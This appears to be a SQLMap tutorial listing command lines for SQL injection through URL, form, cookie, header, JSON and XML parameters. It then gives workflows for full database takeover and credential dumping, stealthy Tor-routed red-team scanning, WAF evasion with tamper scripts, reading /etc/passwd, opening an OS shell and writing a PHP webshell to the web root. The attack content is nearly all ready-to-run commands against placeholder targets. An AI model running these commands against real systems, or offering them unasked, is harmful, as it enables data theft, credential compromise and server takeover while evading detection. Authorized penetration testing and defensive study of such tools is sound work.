Parameter Mastery — Injection Points & Data Handling
Understanding how to specify injection points and handle different types of data is critical for successful SQLMap testing. This guide covers every parameter type and method pros use.

GET parameters are the most common injection points. They appear in the URL after ? and are separated by &.

  • Basic target: -u "http://target.com/page.php?id=1"
  • Multiple parameters: -u "http://target.com/page.php?id=1&cat=2" -p id,cat
  • Test all parameters: -u "http://target.com/page.php?id=1&cat=2" --level=3
  • Specific parameter only: -u "http://target.com/page.php?id=1&cat=2" -p id (only tests 'id')
  • Force parameter: -u "http://target.com/page.php?id=1" --param-filter=id
💡When SQLMap detects multiple parameters, it tests each one by default. Use -p to limit scope and reduce traffic.

POST parameters are sent in the HTTP request body. Common in login forms, search boxes, and data submission.

  • Inline POST data: -u "http://target.com/login.php" --data="username=admin&password=test"
  • POST with specific parameter: -u "http://target.com/login.php" --data="user=admin&pass=test" -p user
  • POST from file: -u "http://target.com/login.php" --data-file=post.txt
  • Login with CSRF token: -u "http://target.com/login.php" --data="user=admin&pass=test&csrf=TOKEN" --csrf-token=csrf
  • HTTP method override: -u "http://target.com/api" --method=PUT --data="id=1"
🌟Pro tip: Capture POST requests from Burp Suite and save to a file, then use -r request.txt — SQLMap will parse all parameters automatically.

Cookies frequently contain session IDs, user preferences, or tracking data that gets inserted into SQL queries.

  • Basic cookie injection: -u "http://target.com/page.php" --cookie="PHPSESSID=abc123; id=1" -p id
  • Session cookie + target param: -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123; security=low"
  • Cookie from browser: Copy from DevTools → Application → Cookies → paste into --cookie="..."
  • Cookie from file: -u "http://target.com/page.php" --load-cookies=cookies.txt
  • Test cookie values: -u "http://target.com/page.php" --cookie="*" --level=2 (asterisk marks injectable)
💡Use --cookie-jar to save cookies from responses for authenticated session chaining.

SQLMap can test HTTP headers like User-Agent, Referer, X-Forwarded-For, and custom headers. Some applications log headers directly to database.

  • Test User-Agent: -u "http://target.com/page.php?id=1" --level=3 (level 3+ tests headers)
  • Test Referer: -u "http://target.com/page.php?id=1" --level=3 -p Referer
  • Custom header injection: -u "http://target.com/page.php?id=1" --headers="X-Api-Key: *"
  • X-Forwarded-For testing: -u "http://target.com/page.php" --headers="X-Forwarded-For: 127.0.0.1*"
  • Authorization header: -u "http://target.com/api" --headers="Authorization: Bearer *"
⚠Header injection requires --level=3 or higher. Level 1-2 only tests GET/POST parameters by default.

Modern APIs use JSON payloads. SQLMap detects JSON automatically and adapts its injection payloads.

  • JSON POST: -u "http://target.com/api/user" --data='{"id":1}' --headers="Content-Type: application/json"
  • JSON specific key: -u "http://target.com/api/search" --data='{"query":"test"}' -p query
  • REST with authentication: -u "http://target.com/api/v1/users/1" --headers="Authorization: Bearer TOKEN"
  • Nested JSON: -u "http://target.com/api" --data='{"user":{"id":1}}' -p "user[id]"
  • JSON array: -u "http://target.com/api" --data='{"ids":[1,2,3]}' -p "ids[0]"
🌟For APIs, capture the full request with -r request.txt. SQLMap auto-detects JSON/XML and sets the correct Content-Type.

XML-based APIs (SOAP, REST with XML payloads) require special handling. SQLMap can parse and inject into XML nodes.

  • SOAP request: -u "http://target.com/soap" --data='<?xml version="1.0"?><req><id>1</id></req>' --headers="Content-Type: text/xml"
  • XML specific node: -u "http://target.com/api" --data='<user><name>test</name></user>' -p "name"
  • SOAP from file: -u "http://target.com/soap" --data-file=soap-request.xml --headers="SOAPAction: http://tempuri.org/GetUser"

Professional Workflows — How Pros Use SQLMap
Real-world methodologies that penetration testers follow. These step-by-step workflows cover the complete lifecycle from reconnaissance to post-exploitation.
💡 Workflow 1: Quick Confirmation (5 minutes)
When you need to quickly confirm if a parameter is vulnerable before investing time in full exploitation.
1
Run basic detection: sqlmap -u "http://{T}" --batch --level=1 --risk=1
2
If negative, increase level: sqlmap -u "http://{T}" --batch --level=3 --risk=2
3
Fingerprint DBMS: sqlmap -u "http://{T}" --fingerprint --batch
🔒 Workflow 2: Full Database Takeover
The complete workflow for maximum data extraction once injection is confirmed. Used in professional penetration tests.
1
Enumerate databases: sqlmap -u "http://{T}" --dbs --batch
2
List tables: sqlmap -u "http://{T}" -D database_name --tables --batch
3
List columns: sqlmap -u "http://{T}" -D database_name -T users --columns --batch
4
Dump credentials: sqlmap -u "http://{T}" -D database_name -T users -C username,password --dump --batch
5
Crack password hashes: SQLMap auto-prompts to crack with built-in dictionary
🙊 Workflow 3: Stealth / Red Team Engagement
When evasion is critical — minimal footprint, slow and deliberate, with anti-forensic considerations.
1
Route through proxy: sqlmap -u "http://{T}" --proxy="http://127.0.0.1:8080" --tamper=space2comment --random-agent
2
Add delays: --delay=5 --safe-url="http://{T}/" --safe-freq=15
3
Use time-based only: --technique=T --threads=1 (single thread, slowest but stealthiest)
4
Save session: -s /tmp/session.sqlmap to resume without re-scanning
5
Use Tor for anonymity: --tor --tor-type=SOCKS5 --tor-port=9050 --check-tor
⚡ Workflow 4: WAF Evasion & Bypass
When facing Web Application Firewalls (Cloudflare, ModSecurity, AWS WAF, etc.). Escalating tamper complexity.
1
Basic bypass attempt: sqlmap -u "http://{T}" --tamper=space2comment --random-agent --level=2
2
Moderate WAF: --tamper=space2comment,between,randomcase --hpp --level=3
3
Aggressive WAF: --tamper=chardoubleencode,equaltolike,space2comment,between --hpp --time-sec=10
4
If banned: Rotate User-Agent + reduce threads + add delay: --random-agent --threads=1 --delay=3
5
Last resort: --hex --no-cast --time-sec=15 --technique=T (hex encoding, no casting, time-based only)
🚀 Workflow 5: Second-Order Injection (Advanced)
Second-order injection occurs when injected data is stored and used later in a different query. Requires two URLs.
1
Identify entry point (where payload is stored): http://target.com/profile/edit (POST: bio='PAYLOAD')
2
Identify execution point (where stored data is used): http://target.com/profile/view
3
Run SQLMap: sqlmap -u "http://target.com/profile/view" --second-url="http://target.com/profile/edit" --data="bio=test" -p bio --batch
🖥 Workflow 6: OS Shell & Post-Exploitation
Gaining operating system access through SQL injection. Requires specific database privileges.
1
Check privileges: sqlmap -u "http://{T}" --privileges --batch
2
Check if DBA: sqlmap -u "http://{T}" --is-dba --batch (must be TRUE)
3
Read files: sqlmap -u "http://{T}" --file-read="/etc/passwd" --batch
4
Interactive shell: sqlmap -u "http://{T}" --os-shell --batch
5
Write webshell: sqlmap -u "http://{T}" --file-write=shell.php --file-dest=/var/www/html/shell.php
